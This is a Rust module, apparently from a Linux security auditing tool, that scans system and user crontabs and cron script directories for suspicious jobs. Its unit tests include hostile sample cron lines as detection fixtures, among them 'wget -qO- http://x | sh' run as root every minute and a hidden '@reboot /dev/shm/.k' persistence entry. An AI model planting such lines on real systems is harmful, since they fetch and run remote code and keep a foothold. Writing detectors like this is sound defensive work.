//! cron and anacron.

use std::path::{Path, PathBuf};

use super::{file_name, finish, logical_lines, review_fix, snip};
use crate::ctx::Ctx;
use crate::finding::{Acc, Finding, Severity};
use crate::patterns;
use crate::pkg::Ownership;

const NAME: &str = "cron";

#[derive(Clone, Copy, PartialEq, Debug)]
pub enum Kind {
    /// /etc/crontab, /etc/cron.d/*: 5 time fields + user + command.
    System,
    /// User crontabs in /var/spool/cron: 5 time fields + command.
    Spool,
    /// /etc/anacrontab: period delay job-id command.
    Anacron,
    /// Plain scripts in /etc/cron.{hourly,daily,...}.
    Script,
}

fn is_env_assignment(line: &str) -> bool {
    match line.split_once('=') {
        Some((k, _)) => {
            let k = k.trim();
            !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') && !k.chars().next().unwrap_or('0').is_ascii_digit()
        }
        None => false,
    }
}

/// Extract the command part of a crontab line.
pub fn command_of(line: &str, kind: Kind) -> Option<String> {
    let skip = match kind {
        Kind::System if line.starts_with('@') => 2,
        Kind::System => 6,
        Kind::Spool if line.starts_with('@') => 1,
        Kind::Spool => 5,
        Kind::Anacron => 3,
        Kind::Script => 0,
    };
    let mut rest = line.trim_start();
    for _ in 0..skip {
        let end = rest.find(char::is_whitespace)?;
        rest = rest[end..].trim_start();
    }
    (!rest.is_empty()).then(|| rest.to_string())
}

pub fn analyze_text(text: &str, kind: Kind) -> (Acc, usize) {
    let mut acc = Acc::default();
    let mut entries = 0;
    for (ln, line) in logical_lines(text, &['#']) {
        let cmd = if kind == Kind::Script {
            line.clone()
        } else if is_env_assignment(&line) {
            for h in patterns::scan(&line) {
                acc.add(h.sev, format!("line {ln}: {} [{}]", h.what, snip(&line)));
            }
            continue;
        } else {
            match command_of(&line, kind) {
                Some(c) => c,
                None => continue,
            }
        };
        if kind != Kind::Script {
            entries += 1;
            if line.starts_with("@reboot") {
                acc.add(Severity::Med, format!("line {ln}: runs at every boot (@reboot): {}", snip(&cmd)));
            }
            if let Some(bin) = cmd.split_whitespace().next() {
                if let Some((s, r)) = patterns::exec_location(bin) {
                    acc.add(s, format!("line {ln}: {r}"));
                }
            }
            if kind == Kind::Spool {
                acc.add(Severity::Low, format!("line {ln}: user cron job: {}", snip(&cmd)));
            }
        }
        for h in patterns::scan(&cmd) {
            acc.add(h.sev, format!("line {ln}: {} [{}]", h.what, snip(&cmd)));
        }
    }
    (acc, entries)
}

pub fn run(ctx: &Ctx) -> Vec<Finding> {
    let mut files: Vec<(PathBuf, Kind)> = vec![(PathBuf::from("/etc/crontab"), Kind::System), (PathBuf::from("/etc/anacrontab"), Kind::Anacron)];
    for p in ctx.list(Path::new("/etc/cron.d")) {
        files.push((p, Kind::System));
    }
    for d in ["hourly", "daily", "weekly", "monthly", "yearly"] {
        for p in ctx.list(Path::new(&format!("/etc/cron.{d}"))) {
            if file_name(&p) != ".placeholder" {
                files.push((p, Kind::Script));
            }
        }
    }
    for spool in ["/var/spool/cron", "/var/spool/cron/crontabs", "/var/spool/cron/tabs", "/var/spool/fcron"] {
        for p in ctx.list(Path::new(spool)) {
            if ctx.fs.lstat(&p).map(|m| m.is_file()).unwrap_or(false) {
                files.push((p, Kind::Spool));
            }
        }
    }
    let mut out = Vec::new();
    for (p, kind) in files {
        let Some(text) = ctx.read_text(&p) else { continue };
        let owner = if kind == Kind::Spool { Ownership::Unknown } else { ctx.owner(&p) };
        ctx.record_file(&Ctx::key(NAME, &p), &p, matches!(owner, Ownership::Owned(_)));
        let (acc, _) = analyze_text(&text, kind);
        let base = (kind != Kind::Spool).then_some(Severity::Low);
        let user = file_name(&p);
        let fix = |_: &Ownership| match kind {
            Kind::Spool => format!("Review: sudo crontab -l -u {u}\nEdit/remove entries: sudo crontab -e -u {u}", u = crate::util::shell_quote(&user)),
            _ => review_fix(ctx, &p),
        };
        if let Some(f) = finish(ctx, NAME, &p, acc, &owner, base, fix) {
            out.push(f);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::testutil::{find, run_check};
    use crate::util::fs::testutil::FakeRoot;

    #[test]
    fn command_extraction() {
        assert_eq!(command_of("*/5 * * * * root /usr/bin/x --y", Kind::System).as_deref(), Some("/usr/bin/x --y"));
        assert_eq!(command_of("@reboot /tmp/x", Kind::Spool).as_deref(), Some("/tmp/x"));
        assert_eq!(command_of("0 3 * * * curl x|sh", Kind::Spool).as_deref(), Some("curl x|sh"));
        assert_eq!(command_of("1 5 cron.daily run-parts /etc/cron.daily", Kind::Anacron).as_deref(), Some("run-parts /etc/cron.daily"));
        assert!(is_env_assignment("SHELL=/bin/sh"));
        assert!(!is_env_assignment("*/5 * * * * root x=1"));
    }

    #[test]
    fn spool_and_system() {
        let r = FakeRoot::new("cron");
        r.write("/etc/crontab", "SHELL=/bin/sh\n# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n");
        r.write("/var/spool/cron/alice", "@reboot /dev/shm/.k\n0 * * * * /usr/bin/backup\n");
        r.write("/etc/cron.d/dl", "* * * * * root wget -qO- http://x | sh\n");
        let (_, v) = run_check(&r, run);
        assert_eq!(find(&v, "/var/spool/cron/alice").unwrap().severity, Severity::High);
        assert_eq!(find(&v, "/etc/cron.d/dl").unwrap().severity, Severity::High);
        // No package db in the fake root → ownership unknown → clean crontab not flagged.
        assert!(find(&v, "/etc/crontab").is_none());
    }
}
